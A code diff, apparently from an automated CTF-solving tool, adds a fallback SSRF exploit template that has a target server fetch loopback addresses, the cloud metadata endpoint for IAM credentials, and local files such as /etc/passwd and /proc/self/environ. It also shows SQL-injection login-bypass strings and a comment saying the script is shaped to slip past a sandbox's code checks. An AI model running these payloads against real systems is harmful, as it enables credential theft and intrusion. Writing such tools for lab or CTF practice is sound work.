@@ -202,6 +202,40 @@ for t in traversals:
             print('req fail:', e)
 '''
 
+    _FALLBACK_SSRF = r'''
+import httpx, urllib.parse
+base = __URL__
+# SSRF：让「目标服务端」代发请求到内网/本地/云元数据。本脚本只负责把 payload
+# 通过目标的 SSRF 参数下发，由目标服务端去抓取——纯 httpx GET，沙盒友好
+# （不含 os.popen/命令注入，不被沙盒 AST 拦截）。
+parts = urllib.parse.urlparse(base)
+port = parts.port or (443 if parts.scheme == 'https' else 80)
+# 让目标去抓的候选 URL：回环地址变体 + 云元数据 + 本地文件读
+candidates = [
+    f'http://127.0.0.1:{port}/web-011/flag',
+    f'http://localhost:{port}/web-011/flag',
+    f'http://0.0.0.0:{port}/web-011/flag',
+    f'http://[::1]:{port}/web-011/flag',
+    f'http://127.0.0.1:{port}/flag',
+    f'http://127.0.0.1:{port}/flag.txt',
+    f'http://127.0.0.1:{port}/admin',
+    'http://169.254.169.254/latest/meta-data/',
+    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+    'file:///etc/passwd',
+    'file:///flag.txt',
+    'file:///proc/self/environ',
+]
+params = ('url', 'target', 'site', 'image', 'file', 'path', 'redirect', 'to', 'link')
+for cand in candidates:
+    for p in params:
+        try:
+            r = httpx.get(base, params={p: cand}, timeout=10, follow_redirects=True)
+            if 'flag{' in r.text:
+                print('[ssrf-hit] param=%s url=%s -> %s' % (p, cand, r.text[:400]))
+        except Exception as e:
+            pass
+'''
+
     _FALLBACK_SQLI = r'''
 import httpx
 # 登录绕过：SQL 注入必须用 POST form 提交（GET query 参数不触发服务端登录逻辑，
@@ -241,6 +275,8 @@ for up in ["admin' OR '1'='1'-- -", "admin'-- -", "' OR '1'='1'#"]:
             tpl = cls._FALLBACK_BACKUP
         elif any(k in desc for k in ("遍历", "traversal", "download", "路径穿越", "../", "下载")):
             tpl = cls._FALLBACK_TRAVERSAL
+        elif any(k in desc for k in ("ssrf", "服务端请求伪造", "内网", "元数据", "server-side request")):
+            tpl = cls._FALLBACK_SSRF
         else:
             tpl = cls._FALLBACK_SQLI
         return tpl.replace("__URL__", repr(url)).replace("__PARAMS__", params)
